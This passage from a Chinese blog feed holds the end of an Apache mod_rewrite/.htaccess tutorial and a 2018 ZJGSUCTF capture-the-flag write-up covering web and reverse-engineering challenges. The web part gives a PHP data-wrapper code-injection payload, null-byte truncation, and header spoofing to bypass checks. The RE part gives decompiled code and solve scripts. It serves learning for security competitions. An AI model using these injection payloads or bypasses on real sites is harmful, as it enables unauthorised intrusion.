将会交给/def规则处理Alias /def /ghi</code></pre><ul><li><code>S=num(skip next rule(s))</code>：跳过 num 条规则。</li><li><code>E=VAR:VAL(set environment variable)</code>：设置环境变量。</li></ul><p>注：P 是代理模式转发，必须用 url 全称，并且要保证 modProxy 打开，也就是下面 <code>httpd.conf</code> 中的如下两个指令：</p><pre><code>LoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so</code></pre><p>如果对应 proxy 模块没加载，则会出现 403 禁止页面。</p><h1 id="特殊字符的含义"><a href="#特殊字符的含义" class="headerlink" title="特殊字符的含义"></a>特殊字符的含义</h1><ul><li><code>*</code> 代表前面 0 或更多个字符。</li><li><code>+</code> 代表前面 1 或更多个字符。</li><li><code>?</code> 代表前面 0 或 1 个字符。</li><li><code>^</code> 代表字符串的开始位置。</li><li><code>$</code> 代表字符串结束的位置。</li><li><code>.</code> 为通配符，代表任何字符。</li><li><code>\</code> 将跟在其后的字符还原为字符本身，例如“<code>\+</code>”代表的就是“<code>+</code>”，而非其它意思。</li><li><code>^</code> 在方括号里表示非的意思。例如 <code>[^.]</code> 代表非通配符。</li></ul><h1 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h1><p><code>.htaccess</code> 文件(或者”分布式配置文件”），全称是 Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache 的 AllowOverride 指令来设置。概述来说，htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许或阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><h1 id="Apache-Rewrite-的方式"><a href="#Apache-Rewrite-的方式" class="headerlink" title="Apache Rewrite 的方式"></a>Apache Rewrite 的方式</h1><p>将 apache 的配置文件 <code>httpd.conf</code> 中</p><pre><code>#LoadModule rewrite_module modules/mod_rewrite.so</code></pre><p>前的 <code>#</code> 去掉。找到 <code>AllowOverride None</code> 改成 <code>AllowOverride All</code>。</p><p>注：<code>AllowOverride</code> 的参数设置为 <code>ALL</code>，表示整台服务器上都支持 URL 规则重写。</p><p>对于不同的网址，需要在 APACHE 中增加如下内容：</p><pre><code>&lt;Directory “E:/Apache Group/Apache2/htdocs/leapsoul”&gt;/*引号里代表你的web存放目录*//*如果是Linux，只要你定位到你网站目录即可*/Options FollowSymLinksAllowOverride None&lt;/Directory&gt;</code></pre><p>Apache 服务器要读每个网站下目录下的 <code>.htaccess</code> 文件。如果没有这个文件，或者这个文档没有定义任何关于 URL 重写的规则就不会有任何效果。</p><p>只要启用 mod_rewrite，然后简单的通过一个 <code>.htaccess</code> 文件再加上一些简单的规则就可以移除 URL 中的 <code>index.php</code> 了。</p><h2 id="针对整个-apache-服务器的配置"><a href="#针对整个-apache-服务器的配置" class="headerlink" title="针对整个 apache 服务器的配置"></a>针对整个 apache 服务器的配置</h2><p>在网站配置下加入</p><pre><code>RewriteEngine onRewriteRule index.html index.phpRewriteRule (d+).html$ info.php?id=$1</code></pre><p>即通过 <code>index.html</code> 访问就是 <code>index.php</code>；通过 <code>1.html</code> 访问就是 <code>info.php?id=1</code>。</p><h2 id="针对-apache-服务器下的某一目录的配置"><a href="#针对-apache-服务器下的某一目录的配置" class="headerlink" title="针对 apache 服务器下的某一目录的配置"></a>针对 apache 服务器下的某一目录的配置</h2><p>在 <code>.htaccess</code> 文件中加入</p><pre><code>RewriteEngine onRewriteCond %{REQUEST_FILENAME} !-f#这里将除了实际文件以为的所有其他请求都指向下行代码给出的脚本，这里是index.phpRewriteRule .* index.php</code></pre><p>在 Windows 资源管理器里面不允许你建立 <code>.htaccess</code> 这样只有扩展名的文件。所以你必须先将文件保存为其他名字，例如 <code>app.htaccess</code>。然后进入 cmd，输入 <code>ren a.htaccess .htaccess</code> 命令来对文件改名。或者新建一个记事本，另存为 <code>.htaccess</code> 即可。</p><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="如果文件不存在重定向到-404-页面"><a href="#如果文件不存在重定向到-404-页面" class="headerlink" title="如果文件不存在重定向到 404 页面"></a>如果文件不存在重定向到 404 页面</h2><pre><code>RewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule .? /404.php [L]</code></pre><p>这里 <code>-f</code> 匹配的是存在的文件名，<code>-d</code> 匹配的存在的路径名。这段代码在进行 404 重定向之前，会判断你的文件名以及路径名是否存在。还可以在 404 页面上加一个 <code>?url=\$1</code> 参数：</p><pre><code>RewriteRule ^/?(.*)$ /404.php?url=$1 [L]</code></pre><h2 id="域名跳转"><a href="#域名跳转" class="headerlink" title="域名跳转"></a>域名跳转</h2><pre><code>RewriteEngine onRewriteCond %{HTTP_HOST} ^en.smilejay.com [NC]RewriteRule ^(.*) http://www.smilejay.com/ [L]</code></pre><h2 id="配置多用户虚拟服务器"><a href="#配置多用户虚拟服务器" class="headerlink" title="配置多用户虚拟服务器"></a>配置多用户虚拟服务器</h2><pre><code>ServerAdmin webmaster@kiya.usDocumentRoot /home/www/www.kiya.usServerName dns.kiya.usServerAlias dns.kiya.us kiya.us *.kiya.usCustomLog /var/log/httpd/osa/access_log.log” commonErrorLog /var/log/httpd/osa/error_log.log”AllowOverride NoneOrder deny,allowRewriteEngine onRewriteCond %{HTTP_HOST} ^[^.]+.kiya.(cn|us)$RewriteRule ^(.+) %{HTTP_HOST}$1 [C]RewriteRule ^([^.]+).kiya.(cn|us)(.*)$ /home/www/www.kiya.us/sylvan$3?un=$1&amp;%{QUERY_STRING} [L]</code></pre><h2 id="通过-Rewrite-防止盗链"><a href="#通过-Rewrite-防止盗链" class="headerlink" title="通过 Rewrite 防止盗链"></a>通过 Rewrite 防止盗链</h2><pre><code>RewriteEngine OnRewriteCond %{HTTP_REFERER} chinaz.com [NC]RewriteCond %{HTTP_REFERER} im286.com [NC]RewriteRule .*\.(jpg|jpeg|gif|png|rar|zip|txt|ace|torrent|gz|swf)$ http://www.xxx.com/fuck.png [R,NC,L]</code></pre><h2 id="屏蔽-IE-和-Opera-浏览器"><a href="#屏蔽-IE-和-Opera-浏览器" class="headerlink" title="屏蔽 IE 和 Opera 浏览器"></a>屏蔽 IE 和 Opera 浏览器</h2><pre><code>RewriteEngine onRewriteCond %{HTTP_USER_AGENT} ^MSIE [NC,OR]RewriteCond %{HTTP_USER_AGENT} ^Opera [NC]RewriteRule ^.* – [F,L]             #这里&quot;-&quot;表示没有替换，浏览器为IE和Opera的访客将被禁止访问。</code></pre><h2 id="自动添加-php-扩展名及自动换-html-到-php-扩展名"><a href="#自动添加-php-扩展名及自动换-html-到-php-扩展名" class="headerlink" title="自动添加 .php 扩展名及自动换 .html 到 .php 扩展名"></a>自动添加 <code>.php</code> 扩展名及自动换 <code>.html</code> 到 <code>.php</code> 扩展名</h2><pre><code>RewriteEngine OnRewriteBase /testRewriteCond %{REQUEST_FILENAME}.php -fRewriteRule ([^/]+)$ /test/$1.php#for example: /test/admin =&gt; /test/admin.phpRewriteRule ([^/]+)\.html$ /test/$1.php [L]#for example: /test/admin.html =&gt; /test/admin.php</code></pre><h2 id="限制仅显示图片"><a href="#限制仅显示图片" class="headerlink" title="限制仅显示图片"></a>限制仅显示图片</h2><pre><code>#限制目录只能显示图片&lt; IfModule mod_rewrite.c&gt;RewriteEngine onRewriteCond %{REQUEST_FILENAME} !^.*\.(gif|jpg|jpeg|png|swf)$RewriteRule .*$ – [F,L]&lt; /IfModule&gt;</code></pre><h2 id="隐藏-index-php"><a href="#隐藏-index-php" class="headerlink" title="隐藏 index.php"></a>隐藏 <code>index.php</code></h2><pre><code>Options +FollowSymLinksIndexIgnore */*RewriteEngine on# if a directory or a file exists, use it directlyRewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-d# otherwise forward it to index.phpRewriteRule . index.php</code></pre><pre><code>RewriteEngine OnRewriteCond %{REQUEST_FILENAME} !-fRewriteCond %{REQUEST_FILENAME} !-dRewriteRule ^(.*)$ index.php/$1 [L]</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://www.111cn.net/phper/apache/45642.htm" target="_blank" rel="noopener">http://www.111cn.net/phper/apache/45642.htm</a><br><a href="http://smilejay.com/2012/10/apache-rewrite/" target="_blank" rel="noopener">http://smilejay.com/2012/10/apache-rewrite/</a><br><a href="https://www.cnblogs.com/zhenghongxin/p/6798310.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhenghongxin/p/6798310.html</a><br><a href="https://phperzh.com/articles/2922" target="_blank" rel="noopener">https://phperzh.com/articles/2922</a><br><a href="https://zybuluo.com/phper/note/73726" target="_blank" rel="noopener">https://zybuluo.com/phper/note/73726</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018-ZJGSUCTF</title>
    <link href="/2018/05/07/2018-ZJGSUCTF/"/>
    <url>/2018/05/07/2018-ZJGSUCTF/</url>
    
    <content type="html"><![CDATA[<p>第一次连续肝了两天的比赛，真正感受到了比赛的氛围，还有被大佬带飞的感觉，记录一下简单的几道题。</p><a id="more"></a><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="奇淫技巧"><a href="#奇淫技巧" class="headerlink" title="奇淫技巧"></a>奇淫技巧</h2><p>第一关，md5 碰撞。</p><p>第二关，数组绕过。</p><p>第三关，%00 截断。</p><p>第四关，PHP 伪协议 <code>data:text/plain,&lt;?php phpinfo()?&gt;</code>。（附上<a href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">大佬博客</a>）</p><h2 id="送分的"><a href="#送分的" class="headerlink" title="送分的"></a>送分的</h2><p>点击 <code>flag in here</code> 后，跳转到另一个网站，提示为非法源无法访问。</p><p>想到 <code>X-Forwarded-For</code> 和 <code>Referer</code>，经过尝试得到 flag。</p><p><img src="/pics/2018-ZJGSUCTF/WEB/1.jpg" srcset="/img/loading.gif" alt></p><h2 id="给你的小世界"><a href="#给你的小世界" class="headerlink" title="给你的小世界"></a>给你的小世界</h2><p>打开网站先欣赏一遍精彩的小故事，然后查看源码，得到提示。</p><p><img src="/pics/2018-ZJGSUCTF/WEB/2.jpg" srcset="/img/loading.gif" alt></p><p>第一段字母显然是 base64，然后根据解码后得到的提示分别 base32、base16 解密得到 flag。</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><p>RE 这块主要是复现。</p><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>发现题目打不开，原来是文本文件，有一段 C 代码和汇编组成。</p><p><img src="/pics/2018-ZJGSUCTF/RE/1.jpg" srcset="/img/loading.gif" alt></p><p>可以判断下面的汇编代码就是函数 <code>ck1()</code> 的汇编形式。具体操作也很容易看出：</p><pre><code class="asm">.text:0040104A loc_40104A:                             ; CODE XREF: ck1+1F↑j.text:0040104A                 mov     ecx, [ebp+var_4].text:0040104D                 cmp     ecx, [ebp+arg_4].text:00401050                 jge     short loc_40106B.text:00401052                 mov     edx, [ebp+arg_0].text:00401055                 add     edx, [ebp+var_4].text:00401058                 movsx   eax, byte ptr [edx].text:0040105B                 xor     eax, 30h.text:0040105E                 add     eax, 1.text:00401061                 mov     ecx, [ebp+arg_0].text:00401064                 add     ecx, [ebp+var_4].text:00401067                 mov     [ecx], al.text:00401069                 jmp     short loc_401041</code></pre><p>可以看到就是把 <code>enc</code> 字符串中的每个字符分别和 <code>0x30</code> 异或后再加一。</p><p>加密脚本（实际上就是填充函数 <code>ck1()</code> 的内容）如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() {    char enc[37]=&quot;\x55\x5b\x50\x56\x4a\x66\x54\x5b\x52\x5e\x5c\x54\x6e\x43\x1f\x6e\x41\x54\x6e\x43\x57\x58\x42\x6e\x58\x42\x6e\x5e\x5d\x5b\x48\x6e\x50\x42\x5c\x4c&quot;;    for(int i = 0; i &lt; strlen(enc); i++) {        enc[i] ^= 0x30;        enc[i] += 1;    }    printf(&quot;%s\n&quot;,enc);    return 0;}</code></pre><h2 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h2><p>这题涉及到 ida 的一个小技巧 patch，通过<a href="https://bbs.pediy.com/thread-158896.htm" target="_blank" rel="noopener">看雪上的一篇文章</a>了解了一下。f5 发现不行，显示栈不平衡，需要 patch。</p><p><img src="/pics/2018-ZJGSUCTF/RE/2.jpg" srcset="/img/loading.gif" alt></p><p>先根据提示找到出错的位置。在 option 中勾选显示栈指针。然后再找到距离 <code>ret</code> 最近的 <code>call</code>，然后修改栈指针的值。</p><p><img src="/pics/2018-ZJGSUCTF/RE/3.jpg" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-ZJGSUCTF/RE/4.jpg" srcset="/img/loading.gif" alt></p><p>成功 f5 后审计代码：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  const char *enc1; // esi  signed int v4; // eax  int v5; // esi  char sbox; // [esp+Ch] [ebp-238h]  char Dst; // [esp+Dh] [ebp-237h]  char key; // [esp+10Ch] [ebp-138h]  char v10; // [esp+12Eh] [ebp-116h]  char input[52]; // [esp+20Ch] [ebp-38h]  sbox = 0;  memset(&amp;Dst, 0, 0xFFu);  strcpy(&amp;key, &quot;flag{this_is_not_the_flag_hahaha}&quot;);  memset(&amp;v10, 0, 0xDEu);  printf(&quot;input flag:\n&quot;);  scanf(&quot;%50s&quot;, input);  if ( strlen(input) == 33 )  {    enc1 = base64encypt(input);    rc4_init(&amp;sbox, (int)&amp;key, strlen(&amp;key));    rc4_crypto((int)&amp;sbox, (int)enc1, strlen(enc1));    v4 = 0;    v5 = enc1 - flag;    do    {      if ( flag[v5 + v4] != flag[v4] )        exit(0);      ++v4;    }    while ( v4 &lt; 44 );    printf(&quot;Congratulation!!!!!!\n&quot;);  }  return 0;}</code></pre><p>经过对代码的审计，判断出先对输入字符串进行了 base64 加密，然后再通过 rc4 加密。在内存中分别找到 base64 的表以及被加密的 flag。</p><p><img src="/pics/2018-ZJGSUCTF/RE/5.jpg" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-ZJGSUCTF/RE/6.jpg" srcset="/img/loading.gif" alt></p><p>用 python2 中的 <code>pycrypto</code>（使用方法：<code>from Crypto.Cipher</code>）进行 rc4 的加解密；用 <code>base64</code> 库进行 base64 加解密。脚本如下：</p><pre><code class="python">from Crypto.Cipher import ARC4import base64import stringprint &#39;-----------------ARC4-----------------&#39;key = &#39;flag{this_is_not_the_flag_hahaha}&#39;flag = &#39;\x20\xC3\x1A\xAE\x97\x3C\x7A\x41\xDE\xF6\x78\x15\xCB\x4B\x4C\xDC\x26\x55\x8B\x55\xE5\xE9\x55\x75\x40\x3D\x82\x13\xA5\x60\x13\x3B\xF5\xD8\x19\x0E\x47\xCF\x5F\x5E\xDE\x9D\x14\xBD&#39;enc1 = ARC4.new(key).decrypt(flag)print enc1print &#39;----------------base64----------------&#39;replaced = &#39;&#39;Base64 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;table = &#39;ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/&#39;for ch in enc1:    if ch in Base64:        replaced += Base64[string.find(table, str(ch))]    elif ch == &#39;=&#39;:        replaced += &#39;=&#39;print base64.b64decode(replaced)</code></pre><h2 id="New-driver"><a href="#New-driver" class="headerlink" title="New driver"></a>New driver</h2><p>拖进 OD 一运行就退出了。拖进 ida 发现有 tls 反调试：</p><p><img src="/pics/2018-ZJGSUCTF/RE/7.jpg" srcset="/img/loading.gif" alt></p><p>用 PEview 查看 exe 中相关 PE 结构，然后在 010editor 中将对应部分的 value 清零：</p><p><img src="/pics/2018-ZJGSUCTF/RE/8.jpg" srcset="/img/loading.gif" alt></p><p>除去 tls 后查壳发现有 upx。脱去后放进 ida：</p><pre><code class="cpp">int main_0(){  HANDLE thread_2; // [esp+D0h] [ebp-14h]  HANDLE thread_1; // [esp+DCh] [ebp-8h]  j_read_input();  hObject = CreateMutexW(0, 0, 0);  j_strcpy(Dest, Source);  thread_1 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)one, 0, 0, 0);  thread_2 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)two, 0, 0, 0);  CloseHandle(thread_1);  CloseHandle(thread_2);  while ( dword_418008 != -1 )    ;  j_print_dest();  CloseHandle(hObject);  return 0;}</code></pre><p>一开始读取输入字符串，中间创建了两个线程，然后最后与被加密的 flag 进行比较以及输出 flag。回去看两个线程发现第二个线程没干什么事，主要是第一个线程进行了加密。其中加密函数的 sp 指针不平衡，需要修改指针值。修改后，进入函数：</p><pre><code class="cpp">char **__cdecl encrypt(char *input, int index){  char **result; // eax  char v3; // [esp+D3h] [ebp-5h]  v3 = input[index];  if ( (v3 &lt; &#39;a&#39; || v3 &gt; &#39;z&#39;) &amp;&amp; (v3 &lt; &#39;A&#39; || v3 &gt; &#39;Z&#39;) )    exit(0);  if ( v3 &lt; &#39;a&#39; || v3 &gt; &#39;z&#39; )                   // lower case  {    result = (char **)table;    input[index] = table[input[index] - 38];  }  else                                          // upper case  {    result = (char **)table;    input[index] = table[input[index] - 96];  }  return result;}</code></pre><p>对每个字符大小写进行了判断，然后减法操作。还有一点是两个线程每次循环分别都 sleep 了 100s，那么依次循环就会造成奇偶依次加密。solve 脚本：</p><pre><code class="python">table = &#39;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&#39;enc = [0x54, 0x4F, 0x69, 0x5A, 0x69, 0x5A, 0x74, 0x4F, 0x72, 0x59, 0x61, 0x54, 0x6F, 0x55, 0x77, 0x50, 0x6E, 0x54, 0x6F, 0x42, 0x73, 0x4F, 0x61, 0x4F, 0x61, 0x70, 0x73, 0x79, 0x53, 0x79]flag = &#39;&#39;for i in range(len(enc)):  if i % 2 == 0:    flag += chr(enc[i])  else:    idx = table.index(chr(enc[i]))    if idx &gt; 26: # lower case      flag += chr(idx + 38)    else: # upper case      flag += chr(idx + 96)print &#39;flag:&#39;, flag</code></pre><h2 id="Old-driver"><a href="#Old-driver" class="headerlink" title="Old driver"></a>Old driver</h2><p>32 位 exe 文件，拖进 ida 后，除了判断了字串长度为 40 和前后缀的 check，还发现函数被加密了：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  int i; // ecx  signed int j; // eax  char input[39]; // [esp+0h] [ebp-40h]  char v7; // [esp+27h] [ebp-19h]  int v8; // [esp+34h] [ebp-Ch]  __int16 v9; // [esp+38h] [ebp-8h]  char v10; // [esp+3Ah] [ebp-6h]  input[0] = 0;  memset(&amp;input[1], 0, 0x31u);  printf(&quot;input flag:\n&quot;);  scanf(&quot;%50s&quot;, input);  if ( strlen(input) == 40 )  {    for ( i = 0; i &lt; (char *)nullsub_1 - (char *)dword_401000; ++i )      *((_BYTE *)dword_401000 + i) ^= 0xBBu;    v9 = 32123;    v8 = 1734437990;    v10 = 0;    j = 0;    do    {      if ( input[j] != *((_BYTE *)&amp;v8 + j) )        goto LABEL_8;      ++j;    }    while ( j &lt; 5 );    LOBYTE(i) = v7;    if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8:      exit(0);    ((void (__fastcall *)(int, char *))loc_4010B0)(i, input);  }  return 0;}</code></pre><p>可以用 IDAPython 来 patch 一下：</p><pre><code class="python">from ida_bytes import *start_addr = 0x00401000end_addr = 0x00401260for i in range(start_addr, end_addr, 4):  tmp = get_bytes(i, 1)  patch_bytes(i, chr(ord(tmp) ^ 0xbb))</code></pre><p>或者用 Ollydbg 把解密过后的程序 dump 出来。找到加密过后的位置设下断点，断下来之后 dump 即可（注意前面还需要过一个长度的 check）：</p><p><img src="/pics/2018-ZJGSUCTF/RE/9.jpg" srcset="/img/loading.gif" alt></p><p>把 dump 出来的程序拖进 ida：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  int i; // ecx  signed int j; // eax  char input[39]; // [esp+0h] [ebp-40h]  char v7; // [esp+27h] [ebp-19h]  int v8; // [esp+34h] [ebp-Ch]  __int16 v9; // [esp+38h] [ebp-8h]  char v10; // [esp+3Ah] [ebp-6h]  input[0] = 0;  memset(&amp;input[1], 0, 0x31u);  printf(&quot;input flag:\n&quot;);  scanf(&quot;%50s&quot;, input);  if ( strlen(input) == 40 )  {    for ( i = 0; i &lt; (char *)nullsub_1 - (char *)maze_solve; ++i )      *((_BYTE *)maze_solve + i) ^= 0xBBu;    v9 = &#39;}{&#39;;    v8 = &#39;galf&#39;;    v10 = 0;    j = 0;    do    {      if ( input[j] != *((_BYTE *)&amp;v8 + j) )        goto LABEL_8;      ++j;    }    while ( j &lt; 5 );    LOBYTE(i) = v7;    if ( v7 != *((_BYTE *)&amp;v8 + j) )LABEL_8:      exit(0);    base64(i, input);  }  return 0;}</code></pre><p>进入加密函数后，先是对六位异或，然后 base64 几位字符，最后走个 maze。solve 脚本：</p><pre><code class="python">import base64flag = &#39;flag{&#39;enc1 = [0xF2, 0xEE, 0xEF, 0xF5, 0xD9, 0xEF]for i in range(len(enc1)):  flag += chr(enc1[i] ^ 0x86)enc2 = &#39;z91c&#39;[::-1] + &#39;fNWb&#39;[::-1]flag += base64.b64decode(enc2)# maze# --------# g +    +# + + ++ +# + + #+ +# + ++++ +# + ++++ +# +      +# --------# &#39;a&#39;-down &#39;2&#39;-up &#39;q&#39;-left &#39;w&#39;-rightpath = &#39;waaaaawwwww22222qqaaw&#39;flag += pathflag += &#39;}&#39;print &#39;flag:&#39;, flag</code></pre><h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><pre><code class="shell">$ file re5re5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1c630722da16df2163ff83ea21cce93bf6b71a87, not stripped</code></pre><p>32 位 elf 拖进 ida 查看：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+0h] [ebp-2F0h]  char m_t; // [esp+80h] [ebp-270h]  char matrix; // [esp+180h] [ebp-170h]  char input; // [esp+282h] [ebp-6Eh]  int pipes[2]; // [esp+2C8h] [ebp-28h]  __pid_t pid; // [esp+2D0h] [ebp-20h]  size_t length; // [esp+2D4h] [ebp-1Ch]  int *v11; // [esp+2E4h] [ebp-Ch]  v11 = &amp;argc;  length = 0;  memset(&amp;v4, 0, 0x80u);  puts(&quot;input flag:&quot;);  __isoc99_scanf();  length = strlen(&amp;input);  if ( length != 64 )    return 0;  if ( pipe(pipes) &lt; 0 )    exit(1);  pid = fork();  if ( pid &lt; 0 )    exit(1);  if ( pid &lt;= 0 )                               // children process  {    close(pipes[1]);    read(pipes[0], &amp;input, length);    ck2((char **)&amp;matrix, &amp;input);    ck3((char **)key_matrix, (char **)&amp;matrix, (int)&amp;m_t, 8, 8, 8);    if ( ck4((int)&amp;m_t) )      printf(&quot;Congratulate!!!&quot;);  }  else                                          // father process  {    close(pipes[0]);    ck1(&amp;input, length);    write(pipes[1], &amp;input, length);    wait(0);  }  return 0;}</code></pre><p>main 函数中主要是先读取一个字符串，如果长度不为 64 则退出。之后 fork 了一个子进程，然后新建一个 pipe，在父进程把字符串输入 pipe，经过 <code>ck1()</code> 之后送到 pipe 里；子进程从 pipe 读取字符串，经过 <code>ck2()</code> 和 <code>ck3()</code> 后，在 <code>ck4()</code> 里判断。下面一个个分析。</p><p><code>ck1()</code> 是 rot13 加密：</p><pre><code class="cpp">int __cdecl ck1(char *input, int length){  int result; // eax  char v3; // [esp+Bh] [ebp-5h]  int i; // [esp+Ch] [ebp-4h]  for ( i = 0; ; ++i )  {    result = i;    if ( i &gt;= length )      break;    v3 = input[i] + 13;    if ( input[i] &lt;= 96 || input[i] &gt; 122 )    {      if ( input[i] &lt;= 64 || input[i] &gt; 90 )      {        v3 = input[i];      }      else if ( (unsigned __int8)v3 &gt; 0x5Au )      {        v3 = input[i] - 13;      }    }    else if ( (unsigned __int8)v3 &gt; 0x7Au )    {      v3 = input[i] - 13;    }    input[i] = v3;  }  return result;}</code></pre><p><code>ck2()</code> 这里把输入的字符串转化成 8x8 的矩阵：</p><pre><code class="cpp">signed int __cdecl ck2(char **m, char *input){  signed int result; // eax  int v3; // eax  char *v4; // edx  int v5; // [esp+4h] [ebp-Ch]  signed int i; // [esp+8h] [ebp-8h]  signed int j; // [esp+Ch] [ebp-4h]  result = 134520832;  v5 = 0;  for ( i = 0; i &lt;= 7; ++i )  {    for ( j = 0; j &lt;= 7; ++j )    {      v3 = v5;      v5 += (int)&amp;(&amp;GLOBAL_OFFSET_TABLE_)[4290763520] + 1;      v4 = (char *)input[v3];      result = j;      (&amp;m[8 * i])[j] = v4;    }  }  return result;}</code></pre><p><code>ck3()</code> 将输入的矩阵与一个 global 的矩阵 <code>key</code> 相乘：</p><pre><code class="cpp">int __cdecl ck3(char **key, char **input, char **a3, int a4_8, int a5_8, int a6_8){  int result; // eax  int m; // [esp+4h] [ebp-10h]  int i; // [esp+8h] [ebp-Ch]  int k; // [esp+8h] [ebp-Ch]  int j; // [esp+Ch] [ebp-8h]  int l; // [esp+Ch] [ebp-8h]  for ( i = 0; i &lt; a5_8; ++i )  {    for ( j = 0; j &lt; a4_8; ++j )      (&amp;a3[8 * i])[j] = 0;  }  for ( k = 0; ; ++k )  {    result = k;    if ( k &gt;= a5_8 )      break;    for ( l = 0; l &lt; a4_8; ++l )    {      for ( m = 0; m &lt; a6_8; ++m )        (&amp;a3[8 * k])[l] = &amp;(&amp;a3[8 * k])[l][(_DWORD)(&amp;key[8 * k])[m] * (_DWORD)(&amp;input[8 * m])[l]];    }  }  return result;}</code></pre><p>最后的 <code>ck4()</code> 将输出的矩阵与 global 的 <code>enc_flag</code> 进行比较：</p><pre><code class="cpp">signed int __cdecl ck4(char **m){  signed int i; // [esp+8h] [ebp-Ch]  signed int j; // [esp+Ch] [ebp-8h]  for ( i = 0; i &lt;= 7; ++i )  {    for ( j = 0; j &lt;= 7; ++j )    {      if ( (&amp;m[8 * i])[j] != *(char **)&amp;enc_flag[4 * (8 * i + j)] )        return 0;    }  }  return 1;}</code></pre><p>主要用 numpy，可以比较方便地实现矩阵间的运算。脚本如下：</p><pre><code class="python">import numpy as npkey = [0x0000002B, 0x00000016, 0x0000001E, 0x00000053, 0x00000035, 0x00000039, 0x00000020, 0x00000029, 0x00000035, 0x00000063, 0x0000000A, 0x00000028, 0x0000002C, 0x00000006, 0x00000032, 0x0000002A, 0x00000055, 0x00000039, 0x00000014, 0x0000005F, 0x00000020, 0x00000019, 0x00000034, 0x00000021, 0x00000019, 0x0000000B, 0x0000005A, 0x00000009, 0x00000050, 0x00000034, 0x0000006F, 0x0000005C, 0x00000016, 0x0000001A, 0x00000068, 0x00000063, 0x00000034, 0x0000004E, 0x00000016, 0x00000045, 0x0000004C, 0x00000053, 0x0000002F, 0x0000003F, 0x0000003F, 0x00000028, 0x00000069, 0x00000051, 0x00000039, 0x00000044, 0x00000012, 0x00000024, 0x0000000A, 0x0000004D, 0x00000055, 0x00000031, 0x00000049, 0x0000003B, 0x00000040, 0x0000003B, 0x00000043, 0x00000028, 0x00000021, 0x00000036]enc = [0x00009A06, 0x0000879A, 0x00007DC4, 0x00008F1F, 0x000088AC, 0x0000850B, 0x0000785D, 0x0000822E, 0x00008FBC, 0x00007F69, 0x000081E5, 0x00008714, 0x00008572, 0x00008786, 0x00006A94, 0x000076FE, 0x0000A871, 0x00009A1E, 0x0000967E, 0x00009D97, 0x00009D4B, 0x00009AC6, 0x00007E38, 0x00008C62, 0x0000CD4A, 0x00009116, 0x0000A837, 0x0000A960, 0x0000A3A7, 0x00009B7E, 0x0000AC9C, 0x0000AB9E, 0x0000C94C, 0x0000AD7C, 0x0000A2C8, 0x0000BD86, 0x0000B1ED, 0x0000AD94, 0x0000A195, 0x0000AFE8, 0x0000ED71, 0x0000C239, 0x0000CD7E, 0x0000D459, 0x0000CEFF, 0x0000CBBC, 0x0000B972, 0x0000C36F, 0x0000A82A, 0x000089EF, 0x00008CBF, 0x00009AD1, 0x0000868F, 0x000086A6, 0x00007A26, 0x00007CD2, 0x0000C000, 0x0000A97A, 0x0000A470, 0x0000B3C8, 0x0000AFE5, 0x0000ABB9, 0x00008F7D, 0x0000A70A]key = np.mat(key).reshape(8, 8)enc = np.mat(enc).reshape(8, 8)# enc = key * out# out = key逆 * encout = key.I * encout = out.reshape(1, 64).tolist()[0]for i in range(len(out)):  out[i] = int(round(out[i]))print outflag = &#39;&#39;for i in range(len(out)):  flag += chr(out[i])print flagdef rot13(s):    out = &#39;&#39;    for ch in s:        tmp = ord(ch) + 13        if ch.isupper():            if tmp &gt; 90:                tmp -= 26        elif ch.islower():            if tmp &gt; 122:                tmp -= 26        else:            tmp = ord(ch)        out += chr(tmp)    return outflag = rot13(flag)print &#39;flag:&#39;, flag</code></pre><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="贝斯家族永不言败"><a href="#贝斯家族永不言败" class="headerlink" title="贝斯家族永不言败"></a>贝斯家族永不言败</h2><p>各种 base 解码。</p><h2 id="壮壮可能是疯了…"><a href="#壮壮可能是疯了…" 